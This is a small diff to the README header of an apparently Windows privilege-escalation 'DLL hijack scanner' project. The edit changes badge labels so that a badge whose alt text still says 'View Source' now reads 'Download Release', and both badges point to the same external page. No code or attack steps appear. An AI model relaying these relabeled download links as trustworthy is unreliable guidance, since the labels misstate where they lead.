@@ -4,8 +4,8 @@
   <p><strong>Streamlined Vulnerability Discovery for Windows Privilege Escalation</strong></p>
 
   <p>
-<a href="https://hydrasoft.github.io/HydraSoft-DLL-Hijack-Scanner" rel="nofollow"><img src="https://img.shields.io/badge/Download%20Release-d90429?style=for-the-badge&amp;logo=windows&amp;logoColor=white" alt="Download Release" style="max-width: 100%;"></a>
-<a href="https://hydrasoft.github.io/HydraSoft-DLL-Hijack-Scanner" rel="nofollow"><img src="https://img.shields.io/badge/View%20Source-00509d?style=for-the-badge&amp;logo=delphi&amp;logoColor=white" alt="View Source" style="max-width: 100%;"></a>
+<a href="https://hydrasoft.github.io/HydraSoft-DLL-Hijack-Scanner" rel="nofollow"><img src="https://img.shields.io/badge/Download%20Build-d90429?style=for-the-badge&amp;logo=windows&amp;logoColor=white" alt="Download Release" style="max-width: 100%;"></a>
+<a href="https://hydrasoft.github.io/HydraSoft-DLL-Hijack-Scanner" rel="nofollow"><img src="https://img.shields.io/badge/Download%20Release-00509d?style=for-the-badge&amp;logo=delphi&amp;logoColor=white" alt="View Source" style="max-width: 100%;"></a>
   </p>
 
   <hr>
